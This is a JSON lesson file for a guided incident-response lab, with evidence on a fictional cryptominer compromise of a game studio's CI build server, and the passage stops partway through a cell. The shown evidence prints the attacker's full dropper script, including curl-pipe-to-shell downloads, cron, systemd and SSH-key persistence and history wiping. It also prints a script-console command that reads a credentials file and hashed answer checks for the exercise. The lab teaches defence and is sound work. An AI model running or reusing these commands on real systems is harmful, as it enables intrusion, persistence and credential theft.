@@ -1,0 +1,220 @@
+{
+ "order": 6,
+ "title": "The miner in the build server",
+ "kicker": "Linux server compromise",
+ "units": [
+  2,
+  3,
+  5
+ ],
+ "level": "Intermediate",
+ "minutes": 60,
+ "summary": "Brightloom Games' build server has run at full CPU all night. Trace a brute-forced CI login to a script console, a dropper, three kinds of persistence and a cryptominer talking to a mining pool, then clean up and rebuild.",
+ "tools": [
+  "grep",
+  "awk",
+  "sort",
+  "uniq",
+  "nmap",
+  "curl",
+  "tshark",
+  "dig",
+  "whois",
+  "sha256sum",
+  "Python"
+ ],
+ "titlePrefix": "Incident runbook: Brightloom build server",
+ "ctf": "One of the attacker's ways back in carries a flag in its comment (step 7). Submit it on the CTF board as \"The miner in the build server\".",
+ "id": "miner--guided",
+ "files": [
+  "case/alert.txt",
+  "case/auth.log",
+  "case/capture.pcap",
+  "case/ci_access.log",
+  "case/ci_audit.log",
+  "case/cpu_metrics.csv",
+  "case/known_bad.txt",
+  "case/netflow.csv",
+  "case/persist/crontab_forgeway.txt",
+  "case/persist/etc_cron.d_sysupdate",
+  "case/persist/root_authorized_keys",
+  "case/persist/sudoers.d_forgeway",
+  "case/persist/sysupdate.service",
+  "case/ps.txt",
+  "case/ss.txt",
+  "case/suspect/config.json",
+  "case/suspect/kswapd0.strings.txt",
+  "case/suspect/x.sh",
+  "net/certs.txt",
+  "net/dns.txt",
+  "net/hosts.txt",
+  "net/routes.txt",
+  "net/whois.txt",
+  "net/www/403.htm",
+  "net/www/404.htm",
+  "net/www/ci_403.htm",
+  "net/www/ci_login.htm",
+  "net/www/ci_robots.txt",
+  "net/www/k_pub.txt",
+  "net/www/kswapd0.bin",
+  "net/www/pool.htm",
+  "net/www/pool_wallet.json",
+  "net/www/router.htm",
+  "net/www/x_sh.txt"
+ ],
+ "base": "miner",
+ "supportLevel": "guided",
+ "levels": {
+  "worked": "miner",
+  "guided": "miner--guided",
+  "solo": "miner--solo"
+ },
+ "guide": "media/guides/miner/index.html",
+ "template": [
+  {
+   "t": "md",
+   "s": "# Incident runbook: the miner in the build server\n\n08:30, Thursday 5 Nov. Monitoring says **build01** at **Brightloom Games** has been above 95% CPU for six hours, and developers say game builds take 38 minutes instead of 6. build01 runs Forgeway CI, a Jenkins-style build server. You are on call.\n\nThe evidence is in `~/case` (Linux) and `case/` (Python). The network tools (`nmap`, `curl`, `wget`, `tshark`, `dig`, `nslookup`, `host`, `whois`, `ping`, `traceroute`, `nc`, `ssh`, `openssl`, `nikto`, `gobuster`) work on a recorded copy of the case network; nothing leaves your browser.\n\nThe steps follow the incident response lifecycle: **verify, scope, find the way in, preserve evidence, contain, eradicate, recover, learn**. The order is based on the open LetsDefend incident response playbooks (MIT licence).\n\n### What you'll learn\n\n- Spot a cryptominer hiding behind a kernel thread's name\n- Prove a brute force on a CI login, and why a script console is a remote shell\n- Find three kinds of Linux persistence: cron, systemd and SSH keys\n- Follow mining traffic to a pool and contain, eradicate and rebuild\n\n### How to use this runbook\n\n- Run a cell with **Shift+Enter** (or its Run button). Run the cells in order: the first Linux cell copies the evidence into `~/case`.\n- Tick each `- [ ]` box when you have done it.\n- Stuck? Open a **Hint** under the step.\n- Type your answer into each **check** box and it tells you if you are right. Answers are short: an address, a name, a number or a time such as 09:05.\n- Write your notes under each step. Download .ipynb keeps your notes and every output.\n\n## 1. Triage\n\n- [ ] Write your name and the time you started here:\n- [ ] Hash the evidence before you touch it\n- [ ] Read the alert, then map the network\n\n> Hint: `sort -t, -k2 -n` sorts a CSV by its second column. Or read cpu_metrics.csv from the top and find where the numbers jump.\n?> How many hosts does `nmap -sn 10.60.0.0/24` find up? :: sha256:4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a\n?> At what time (HH:MM) did CPU first go above 90%? :: sha256:8dc525a190e6749d30d6548bd1b26bf2b45be8d46a6bbe7feda7274e30299e6f"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with ls.\n",
+   "e": ".:\ntotal 64\n-rw-r--r--    1 root     root           333 Nov  4 21:27 alert.txt\n-rw-r--r--    1 root     root           822 Nov  4 21:27 auth.log\n-rw-r--r--    1 root     root          6062 Nov  4 21:27 capture.pcap\n-rw-r--r--    1 root     root         22895 Nov  4 21:27 ci_access.log\n-rw-r--r--    1 root     root           839 Nov  4 21:27 ci_audit.log\n-rw-r--r--    1 root     root          2914 Nov  4 21:27 cpu_metrics.csv\n-rw-r--r--    1 root     root           579 Nov  4 21:27 known_bad.txt\n-rw-r--r--    1 root     root          1072 Nov  4 21:27 netflow.csv\ndrwxr-xr-x    2 root     root           140 Nov  4 21:27 persist\n-rw-r--r--    1 root     root           483 Nov  4 21:27 ps.txt\n-rw-r--r--    1 root     root           565 Nov  4 21:27 ss.txt\ndrwxr-xr-x    2 root     root           100 Nov  4 21:27 suspect\n\npersist:\ntotal 20\n-rw-r--r--    1 root     root            83 Nov  4 21:27 crontab_forgeway.txt\n-rw-r--r--    1 root     root            76 Nov  4 21:27 etc_cron.d_sysupdate\n-rw-r--r--    1 root     root           208 Nov  4 21:27 root_authorized_keys\n-rw-r--r--    1 root     root           103 Nov  4 21:27 sudoers.d_forgeway\n-rw-r--r--    1 root     root           219 Nov  4 21:27 sysupdate.service\n\nsuspect:\ntotal 12\n-rwxr-xr-x    1 root     root           258 Nov  4 21:27 config.json\n-rwxr-xr-x    1 root     root           307 Nov  4 21:27 kswapd0.strings.txt\n-rwxr-xr-x    1 root     root           796 Nov  4 21:27 x.sh\n4a7156533227b11d189d19a36584471550e7cd865227085f57093cfa2f3a9887  alert.txt\n0473f7824494a3dd3344a4b39ae69a136ae2453e5aa25c9cb29a5d8647bdd9f3  auth.log\na0309f48ba18026d23536f6073e903fe9b5f05257d23af077d9dd7fca0d0ac82  capture.pcap\n9f9161be98a30eccf708be89af259043b606b7d3d9a59457687806e175e1d29c  ci_access.log\nf63ee13bfb7b36a119a70d741ec58b05e4679da03568002773ef2e55d37c0f1c  ci_audit.log\n93fc1e86b88fe26e2c9d9ae92499857ee60a61e8329d3ee2c84c0eb24d855f53  cpu_metrics.csv\nc3ea094905b2496e4ae60b9fa02f8892f13b7796275ac76c6b20838760ca76fd  known_bad.txt\nd34c081b9e3ee46f05feed63834811adc45162a4146e2d0cfad37e5acfb3fc56  netflow.csv\n8b5ae85d8263a58a5a33bd2528d89d346cec262288454a25f436208b28287966  ps.txt\n45af83a900247c9a766a1612f76c2dcec01641b483f1816276deef1d84835cf4  ss.txt\n7201f44b7479ff8980f00ff1b1ee0415f14b778e35832c842219903a235100cf  persist/crontab_forgeway.txt\nc3d36bf41862fb78d09a13fbc822958909f7c7dc155c33654c9dbaac890c7b21  persist/etc_cron.d_sysupdate\n9f8aa7e49aa743348406c99addb5df55eea80cd3078c6b17014693a73546678b  persist/root_authorized_keys\n554253f31bb695a212e15965fc6d611fb99ad5fbefa4f2ab59ef8ba363282388  persist/sudoers.d_forgeway\n0c1d20d3fce00bbe8de0b8003872408e3daefc24bfe371ae540dc308e0ef79ff  persist/sysupdate.service\nc74355365f8365657a32dbb4ea540260f056872afb173d245df55b99aee765cf  suspect/config.json\n65a6daf753100eba49507216f32e7960e58af62b6727e854e4ab345fa9d6cb50  suspect/kswapd0.strings.txt\n845064c81554efbfaeb6df7477832758034ee5b0e82643a86e288c9a80cc3adc  suspect/x.sh\n---\nMONITORING ALERT  build01.brightloom.lan\nRaised: 2026-11-05 08:30 UTC   Rule: CPU above 95% for 6 hours\nAlso: developers report game-client builds take 38+ minutes (normal: 6).\nbuild01 runs Forgeway CI on port 8080. The firewall forwards ci.brightloom.test:8080\n(192.0.2.60) to it so the outsourced art studio can see build results.\n---\n2026-11-05 02:20,98.5,4.05\n2026-11-05 02:25,98.1,4.32\n2026-11-05 02:30,98.9,4.09\n---\nStarting Nmap 7.94 ( https://nmap.org ) at 2026-11-04 21:27 UTC\nNmap scan report for gw.brightloom.lan (10.60.0.1)\nHost is up (0.00042s latency).\nMAC Address: 52:54:00:12:34:01 (QEMU virtual NIC)\nNmap scan report for build01.brightloom.lan (10.60.0.12)\nHost is up (0.00042s latency).\nMAC Address: 52:54:00:12:34:0C (QEMU virtual NIC)\nNmap scan report for git01.brightloom.lan (10.60.0.20)\nHost is up (0.00042s latency).\nMAC Address: 52:54:00:12:34:14 (QEMU virtual NIC)\nNmap scan report for dev-ws03.brightloom.lan (10.60.0.31)\nHost is up (0.00042s latency).\nMAC Address: 52:54:00:12:34:1F (QEMU virtual NIC)\nNmap done: 256 IP addresses (4 hosts up) scanned in 6.68 seconds",
+   "a": "cd ~/case\nls -l . persist suspect\nsha256sum *.* persist/* suspect/*\necho ---\ncat alert.txt\necho ---\nawk -F, 'NR > 1 && $2 > 90 {print; n++} n == 3 {exit}' cpu_metrics.csv\necho ---\nnmap -sn 10.60.0.0/24"
+  },
+  {
+   "t": "md",
+   "s": "## 2. Verify: is this real?\n\nAlerts are often wrong. Before you wake anyone up, decide whether this is a **true positive**.\n\n- [ ] What exactly raised the alarm, and when?\n- [ ] Name two pieces of evidence that prove something bad really happened\n- [ ] What harmless explanation would make this a false positive? Can you rule it out?\n- [ ] Decision: true positive / false positive (write it here)\n\nOn Linux, real kernel threads such as `kswapd0` show in `ps` with square brackets and use almost no CPU. A program in `/var/tmp` with the same name is a disguise.\n\n> Hint: Compare the two kswapd0 lines in ps.txt: who runs them, where they live, and how much CPU they use.\n> Hint: ss.txt shows which program owns each network connection.\n?> What is the PID of the fake kswapd0? :: sha256:0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6\n?> Which remote TCP port is the fake kswapd0 connected to? :: sha256:318aee3fed8c9d040d35a7fc1fa776fb31303833aa2de885354ddf3d44d8fb69"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with grep.\n",
+   "e": "USER         PID %CPU %MEM COMMAND\nroot          98  0.0  0.0 [kswapd0]\nforgeway     911  6.1 18.4 /usr/bin/java -jar /usr/share/forgeway/forgeway.war --httpPort=8080\nroot        4242 391.7  3.2 /var/tmp/.cache/kswapd0 -c /var/tmp/.cache/config.json\n---\nState   Recv-Q Send-Q  Local Address:Port    Peer Address:Port   Process\nESTAB   0      0          10.60.0.12:41822   198.51.100.77:3333   users:((\"kswapd0\",pid=4242))\n---\n{\n \"autosave\": false,\n \"cpu\": {\n  \"enabled\": true,\n  \"max-threads-hint\": 100\n },\n \"donate-level\": 0,\n \"pools\": [\n  {\n   \"url\": \"pool.hashmoat.example:3333\",\n   \"user\": \"4BrxWallet9aQm2Lp7\",\n   \"pass\": \"build01\",\n   \"tls\": false\n  }\n ],\n \"background\": true\n}",
+   "a": "grep -E 'kswapd0|java|PID' ps.txt\necho ---\ngrep -E 'kswapd0|State' ss.txt\necho ---\ncat suspect/config.json"
+  },
+  {
+   "t": "md",
+   "s": "## 3. Scope: what is exposed?\n\n- [ ] Which services does build01 offer, and which of them can the internet reach?\n- [ ] What does the CI login page reveal to anyone who visits?\n- [ ] Is the script console open to people who are not signed in?\n\n> Hint: alert.txt says the firewall forwards ci.brightloom.test:8080 to build01. Anything on that port is on the internet.\n?> Which TCP port does Forgeway CI listen on? :: sha256:6c237681e70921603a306be9a1a5d9833fce5c1e268f52b1650970eaad0dce21"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with nmap.\n",
+   "e": "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-04 21:27 UTC\nNmap scan report for build01.brightloom.lan (10.60.0.12)\nHost is up (0.00042s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT      STATE  SERVICE        VERSION\n22/tcp    open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n8080/tcp  open   http           Jetty 10.0.18 (Forgeway CI 2.401.1)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap done: 1 IP address (1 host up) scanned in 3.47 seconds\nStarting Nmap 7.94 ( https://nmap.org ) at 2026-11-04 21:27 UTC\nNmap scan report for ci.brightloom.test (192.0.2.60)\nHost is up (0.048s latency).\nPORT      STATE  SERVICE        VERSION\n8080/tcp  open   http           Jetty 10.0.18 (Forgeway CI 2.401.1)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap done: 1 IP address (1 host up) scanned in 3.47 seconds\n---\n<!doctype html>\n<title>Sign in [Forgeway]</title>\n<h1>Welcome to Forgeway CI</h1>\n<form method=\"post\" action=\"/j_security_check\">\nUsername <input name=\"j_username\"> Password <input type=\"password\" name=\"j_password\">\n<button>Sign in</button>\n</form>\n<footer>Forgeway 2.401.1</footer>\n---\nHTTP/1.1 403 Forbidden\nServer: Jetty(10.0.18)\nDate: Wed, 04 Nov 2026 21:27:45 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 148\nConnection: keep-alive\n\n<!doctype html>\n<title>403 Forbidden</title>\n<h1>Authentication required</h1>\n<p>You are authenticated as: anonymous. Sign in to use this page.</p>\n# we plan to put Forgeway behind the VPN one day\nUser-agent: *\nDisallow: /",
+   "a": "nmap -sV build01.brightloom.lan\nnmap -sV -p 8080 ci.brightloom.test\necho ---\ncurl -s http://ci.brightloom.test:8080/login\necho ---\ncurl -i -s http://ci.brightloom.test:8080/script\ncurl -s http://ci.brightloom.test:8080/robots.txt"
+  },
+  {
+   "t": "md",
+   "s": "## 4. Initial access: the login page\n\n- [ ] Count the failed sign-ins and find the address they came from\n- [ ] Which username was guessed, and when did a guess work?\n- [ ] Why didn't the server stop it after ten tries?\n\n> Hint: A failed sign-in is `POST /j_security_check` with status 401. A working one gets 302 (a redirect to the dashboard).\n> Hint: ci_audit.log names the user. The 2024 lines explain why the password was weak and never locked.\n?> How many failed sign-ins came from 203.0.113.99? :: sha256:8cd2510271575d8430c05368315a87b9c4784c7389a47496080c1e615a2a00b6\n?> Which username did the attacker guess? :: sha256:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918\n?> At what time (HH:MM) did the guess work? :: sha256:470c5b81cbc709ff54ad9b5e610fd2291870f2eb112928ab00d732a895b528a9"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with grep.\n",
+   "e": "    177 203.0.113.99 401\n      1 203.0.113.99 302\n---\n203.0.113.99 - - [05/Nov/2026:02:13:04 +0000] \"POST /j_security_check HTTP/1.1\" 302 0 \"-\" \"python-requests/2.31.0\"\n---\n2024-02-11T10:02:44Z setup: setup wizard skipped by admin (local user database, sign-up disabled)\n2024-02-11T10:03:10Z security: password set for user admin\n2026-11-05T02:13:04Z login: user=admin from=203.0.113.99 (after 0 lockouts: account lockout is not enabled)",
+   "a": "grep j_security_check ci_access.log | awk '{print $1, $9}' | sort | uniq -c | sort -rn\necho ---\ngrep ' 302 ' ci_access.log | grep j_security_check\necho ---\ngrep -E 'login|setup|security' ci_audit.log"
+  },
+  {
+   "t": "md",
+   "s": "## 5. From login to shell: the script console\n\nA CI server's script console runs any code on the server, as the CI user. Admin on a CI server means a shell on the box, and access to every secret the builds use.\n\n- [ ] What did the attacker run through the console? List both scripts\n- [ ] Which secrets file did they read? What lives in it (Git tokens, cloud keys, signing keys)?\n- [ ] Where did the dropper script come from?\n\n> Hint: `grep script-console ci_audit.log` shows each script. The second one downloads and runs a shell script with `curl | sh`.\n?> Which file of secrets did the attacker print through the console? (file name) :: sha256:aaa36223768b459a0161f26b020f1751de14d09644fc839eb50621ac69913668\n?> Which IP address served x.sh? :: sha256:bfeb4c6192985efa05e7fa0740ac45708a515e569e7edaec7fc060ff72b44a0c"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with grep.\n",
+   "e": "203.0.113.99 - - [05/Nov/2026:02:14:20 +0000] \"GET /script HTTP/1.1\" 200 5230 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0\"\n203.0.113.99 - - [05/Nov/2026:02:14:51 +0000] \"POST /script HTTP/1.1\" 200 4180 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0\"\n203.0.113.99 - - [05/Nov/2026:02:15:02 +0000] \"POST /script HTTP/1.1\" 200 1210 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0\"\n---\n2026-11-05T02:14:51Z script-console: user=admin script=\"println(new File('/var/lib/forgeway/credentials.xml').text)\"\n2026-11-05T02:15:02Z script-console: user=admin script=\"['sh','-c','curl -fsSL http://198.51.100.23/x.sh | sh'].execute()\"\n---\n1533.000000\t198.51.100.23\t/x.sh\tcurl/7.81.0\n1534.000000\t198.51.100.23\t/kswapd0\tcurl/7.81.0\n1539.000000\t198.51.100.23\t/config.json\tcurl/7.81.0\n1540.000000\t198.51.100.23\t/sysupdate.service\tcurl/7.81.0\n1571.000000\t198.51.100.23\t/k.pub\tcurl/7.81.0",
+   "a": "grep -E 'POST /script|GET /script' ci_access.log\necho ---\ngrep script-console ci_audit.log\necho ---\ntshark -r capture.pcap -Y 'http.request and ip.src==10.60.0.12' -T fields -e frame.time_relative -e ip.dst -e http.request.uri -e http.user_agent"
+  },
+  {
+   "t": "md",
+   "s": "## 6. Read the dropper and the miner\n\nRead `x.sh` line by line. Never run malware to see what it does; read it.\n\n- [ ] Which competing miners does it kill first?\n- [ ] Which files does it download, and where does it hide them?\n- [ ] How does it become root? What is in `persist/sudoers.d_forgeway`, and why was it added?\n- [ ] What do the strings say the \"kswapd0\" program really is?\n\n> Hint: `sudo -n` runs a command as root only if no password is needed. The sudoers line explains why that worked.\n?> Which account ran sudo to install the persistence? :: sha256:58a9c8b6d18f81ba65b14f875e415bfd2a60e2a474d2721fc28bd2170c0ee1a9\n?> Which sudoers keyword let it become root without a password? :: sha256:c797f6834c354fedaee9e19bd52583f73ee2255bea1d6cc412168eff78675c99"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with cat.\n",
+   "e": "     1\t#!/bin/sh\n     2\tD=/var/tmp/.cache\n     3\tmkdir -p $D && cd $D\n     4\tpkill -f xmrig 2>/dev/null; pkill -f kdevtmpfsi 2>/dev/null\n     5\tcurl -fsSL http://198.51.100.23/kswapd0 -o kswapd0 && chmod +x kswapd0\n     6\tcurl -fsSL http://198.51.100.23/config.json -o config.json\n     7\tcat > /tmp/.inst.sh <<'EOS'\n     8\tcp /var/tmp/.cache/sysupdate.service /etc/systemd/system/sysupdate.service\n     9\tsystemctl daemon-reload && systemctl enable --now sysupdate.service\n    10\techo '*/15 * * * * root curl -fsSL http://198.51.100.23/x.sh | sh >/dev/null 2>&1' > /etc/cron.d/sysupdate\n    11\tmkdir -p /root/.ssh && curl -fsSL http://198.51.100.23/k.pub >> /root/.ssh/authorized_keys\n    12\tEOS\n    13\tcurl -fsSL http://198.51.100.23/sysupdate.service -o sysupdate.service\n    14\tsudo -n /bin/sh /tmp/.inst.sh || nohup ./kswapd0 -c config.json >/dev/null 2>&1 &\n    15\trm -f /tmp/.inst.sh\n    16\thistory -c\n---\n# /etc/sudoers.d/forgeway (added 2024-02-11 so builds can run docker)\nforgeway ALL=(ALL) NOPASSWD: ALL\nNov  5 02:15:40 build01 sudo: forgeway : TTY=unknown ; PWD=/var/tmp/.cache ; USER=root ; COMMAND=/bin/sh /tmp/.inst.sh\nNov  5 02:15:40 build01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=998)\n---\nXMRig 6.21.0\n built on Oct 12 2026 with GCC\ndonate-level\n---\nnot listed: suspect/config.json\nnot listed: suspect/kswapd0.strings.txt\nKNOWN BAD: suspect/x.sh",
+   "a": "cat -n suspect/x.sh\necho ---\ncat persist/sudoers.d_forgeway\ngrep sudo auth.log\necho ---\nhead -3 suspect/kswapd0.strings.txt\necho ---\nsha256sum suspect/* | while read h f; do\n    grep -q \"$h\" known_bad.txt && echo \"KNOWN BAD: $f\" || echo \"not listed: $f\"\ndone"
+  },
+  {
+   "t": "md",
+   "s": "## 7. Persistence: every way back in\n\nAttackers rarely leave one way back. If you remove one and miss another, the miner is back in 15 minutes.\n\n- [ ] The cron file: how often does it re-download x.sh?\n- [ ] The systemd service: what does it start, and what happens if you kill the process?\n- [ ] The SSH keys: which key doesn't belong? Was it used? (A CTF flag is in the key's comment.)\n- [ ] The forgeway user's own crontab: is it clean?\n\n> Hint: In cron, `*/15` in the minute field means every 15 minutes. In systemd, `Restart=always` brings a killed process back.\n> Hint: Compare the two keys in root_authorized_keys. Then grep auth.log for root logins.\n?> How many different persistence mechanisms did the attacker add? :: sha256:4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce\n?> What is the file name of the attacker's systemd unit? :: sha256:81cb95987259a90a2551ba28d64bcf1dd5f5bc84c6df07b66c2e435cc282e2ba\n?> At what time (HH:MM) did the attacker log back in as root over SSH? :: sha256:08218c866bbd592e8f89e9f88fea496ce0d092cc4e7d58510173b23df13818ff"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with for.\n",
+   "e": "== persist/crontab_forgeway.txt\n# m h dom mon dow command\n30 3 * * * /usr/share/forgeway/bin/cleanup-workspaces.sh\n== persist/etc_cron.d_sysupdate\n*/15 * * * * root curl -fsSL http://198.51.100.23/x.sh | sh >/dev/null 2>&1\n== persist/root_authorized_keys\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMd2Pz8kQwErTy5uIoPa3SdFgHjKl9ZxCvBnM1qW2eRt ops@brightloom.test\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq7mXbV0aJk3d9sTqPz1wLr8YcN5eUf2GhKoM4vB6xZ [flag hidden: run the lab to find it]\n== persist/sudoers.d_forgeway\n# /etc/sudoers.d/forgeway (added 2024-02-11 so builds can run docker)\nforgeway ALL=(ALL) NOPASSWD: ALL\n== persist/sysupdate.service\n[Unit]\nDescription=System update helper\nAfter=network-online.target\n\n[Service]\nExecStart=/var/tmp/.cache/kswapd0 -c /var/tmp/.cache/config.json\nRestart=always\nRestartSec=30\nNice=10\n\n[Install]\nWantedBy=multi-user.target\n---\nNov  5 02:15:45 build01 systemd[1]: Started sysupdate.service - System update helper.\nNov  5 02:31:17 build01 sshd[4501]: Accepted publickey for root from 203.0.113.99 port 40022 ssh2: ED25519 SHA256:Hq7mXbV0aJk",
+   "a": "for f in persist/*; do echo \"== $f\"; cat \"$f\"; done\necho ---\ngrep -E 'publickey for root|sysupdate' auth.log"
+  },
+  {
+   "t": "md",
+   "s": "## 8. The network\n\n- [ ] Which name did build01 look up just before mining started?\n- [ ] What does the first message to port 3333 contain? (stratum `login` with a wallet)\n- [ ] How long has the pool connection been open, and how much did it send?\n\n> Hint: Mining pools speak *stratum*, a JSON protocol: `login` once, then many `submit` messages with the work done.\n?> Which domain did build01 look up for the pool? :: sha256:f527aefb245d9804726aa930755a85f334f915cce4fee8dfeb8365d8d365b5d2"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with tshark.\n",
+   "e": "1582.000000\t10.60.0.12\tpool.hashmoat.example\n1582.020000\t10.60.0.1\tpool.hashmoat.example\n---\n    32 1583.000000      10.60.0.12 → 198.51.100.77   TCP        74 41822 → 3333 [SYN] Seq=0 Win=64240 Len=0\n    33 1583.100000      10.60.0.12 → 198.51.100.77   TCP       260 41822 → 3333 [PSH, ACK] Len=194 {id:1, method:login, params:{login:4BrxWallet9aQm2Lp7, pass:build01, agent:XMRig/6.21.0}}\n    35 1626.000000      10.60.0.12 → 198.51.100.77   TCP       220 41822 → 3333 [PSH, ACK] Len=154 {id:2, method:submit, params:{job_id:812, nonce:71ef0ff6}}\n    36 1669.000000      10.60.0.12 → 198.51.100.77   TCP       220 41822 → 3333 [PSH, ACK] Len=154 {id:3, method:submit, params:{job_id:813, nonce:1b054977}}\n---\n================================================================================\nIPv4 Conversations\nFilter:<No Filter>\n                                                 Frames        Bytes\n10.60.0.12 <-> 203.0.113.99                          24        13 kB\n10.60.0.12 <-> 198.51.100.23                          7         3 kB\n10.60.0.12 <-> 198.51.100.77                          9         3 kB\n10.60.0.1 <-> 10.60.0.12                              2    188 bytes\n10.60.0.12 <-> 10.60.0.31                             1    170 bytes\n================================================================================\n(Counted from the frames in this trimmed capture.)",
+   "a": "tshark -r capture.pcap -Y dns -T fields -e frame.time_relative -e ip.src -e dns.qry.name\necho ---\ntshark -r capture.pcap -Y 'tcp.dstport==3333' -c 4\necho ---\ntshark -r capture.pcap -q -z conv,ip"
+  },
+  {
+   "t": "py",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with import.\n",
+   "a": "import csv\nfrom collections import defaultdict\n\nout = defaultdict(int)\nrows = list(csv.DictReader(open(\"case/netflow.csv\")))\nfor r in rows:\n    if r[\"src\"] == \"10.60.0.12\":\n        out[r[\"dst\"] + \":\" + r[\"dport\"]] += int(r[\"bytes_out\"])\nfor k, v in sorted(out.items(), key=lambda x: -x[1]):\n    print(f\"{k:22} {v:>12,} bytes out\")\npool = [r[\"time\"][11:16] for r in rows if r[\"dport\"] == \"3333\"]\nprint(\"pool flows seen at:\", pool)"
+  },
+  {
+   "t": "md",
+   "s": "## 9. Who is behind it?\n\n- [ ] What is the dropper host, and when was its domain registered?\n- [ ] Look up the wallet on the pool: how many machines mine for it? What does that tell you about the campaign?\n- [ ] Who should get an abuse report?\n\nIn a real case, ask before you touch an attacker's servers: it can tip them off, and some actions are illegal. Looking up a public pool page is fine.\n\n> Hint: The wallet is in suspect/config.json. Put it at the end of the pool's /api/wallet/ address.\n?> How many workers does the pool show online for this wallet? :: sha256:7a61b53701befdae0eeeffaecc73f14e20b537bb0f8b91ad7c2936dc63562b25"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with dig.\n",
+   "e": "198.51.100.23\nscan-07.vpsfarm.example.\n% Lab whois record for sysupdate-mirror.example\n\nDomain Name: SYSUPDATE-MIRROR.EXAMPLE\nCreated: 2026-11-01 (4 days before the attack)\nRegistrar: Budget Names Ltd\nRegistrant: REDACTED FOR PRIVACY\nNetRange: 198.51.100.0 - 198.51.100.63\nOrgName: Cheap Hosting VPS (accepts crypto, no ID checks)\nAbuse: abuse@cheap-hosting.example\n---\n{\n \"wallet\": \"4BrxWallet9aQm2Lp7\",\n \"hashrate\": \"41.2 kH/s\",\n \"workers_online\": 37,\n \"workers\": [\n  \"build01\",\n  \"ci-runner-2\",\n  \"gitlab-old\",\n  \"jenkins-qa\",\n  \"...33 more\"\n ],\n \"first_seen\": \"2026-11-01T22:40:11Z\",\n \"paid_xmr\": \"0.83\"\n}\n---\n% Lab whois record for 203.0.113.99\n\nNetRange: 203.0.113.0 - 203.0.113.255\nOrgName: VPS Farm (hourly servers)\nAbuse: abuse@vpsfarm.example\nComment: Seen scanning port 8080 for CI login pages on many networks.",
+   "a": "dig +short dl.sysupdate-mirror.example\ndig -x 203.0.113.99 +short\nwhois sysupdate-mirror.example\necho ---\ncurl -s https://pool.hashmoat.example/api/wallet/4BrxWallet9aQm2Lp7\necho ---\nwhois 203.0.113.99"
+  },
+  {
+   "t": "md",
+   "s": "## 10. Initial access: how did they get in?\n\nThe way in is the door you must close, or it happens again. Tick the one the evidence supports, and write the evidence next to it.\n\n- [ ] Phishing (a message that tricked someone)\n- [ ] Exploit of a public-facing application (a website or service bug)\n- [ ] Valid accounts (a real username and password or key, stolen or misused)\n- [ ] External remote services (VPN, remote desktop, SSH)\n- [ ] Drive-by compromise (a booby-trapped website)\n- [ ] Supply chain or trusted partner\n- [ ] Hardware added (a USB device or rogue machine)\n- [ ] Insider using access they were given\n- [ ] No intrusion (for example, traffic from outside that never got in)"
+  },
+  {
+   "t": "md",
+   "s": "## 11. Preserve the evidence\n\nCleaning up destroys evidence. Copy everything to a safe place, record the hashes and pack it before you change anything.\n\n- [ ] Copy the evidence and write SHA256SUMS\n- [ ] Note who collected it, when, and where it is stored (chain of custody)\n\n> Hint: Collect before you clean. Once you delete the cron file and kill the miner, that evidence is gone forever."
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with mkdir.\n",
+   "e": "packed /root/evidence-20261104T2127.tar.gz\n-rw-r--r--    1 root     root          7716 Nov  4 21:27 /root/evidence-20261104T2127.tar.gz\n18 SHA256SUMS",
+   "a": "mkdir -p ~/evidence && cp -r ~/case/* ~/evidence/\ncd ~/evidence && find . -type f ! -name SHA256SUMS -exec sha256sum {} + > SHA256SUMS\npack=~/evidence-$(date -u +%Y%m%dT%H%M).tar\ntar cf \"$pack\" -C ~/evidence .\n(gzip -f \"$pack\" 2>/dev/null && echo \"packed $pack.gz\") || echo \"packed $pack\"\nls -l ~/evidence-*\nwc -l SHA256SUMS\ncd ~/case"
+  },
+  {
+   "t": "md",
+   "s": "## 12. Contain\n\n- [ ] Remove the port forward so the CI server is no longer on the internet\n- [ ] Block the dropper host, the pool and the attacker address\n- [ ] Disable the admin account and end its sessions\n- [ ] Revoke every secret in credentials.xml now: assume they are stolen\n\nThe cell prints the commands for the real systems. Nothing here touches a real firewall.\n\n> Hint: Contain the way in first (the port forward), then the outbound paths (pool and dropper), then the stolen secrets.\n"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with echo.\n",
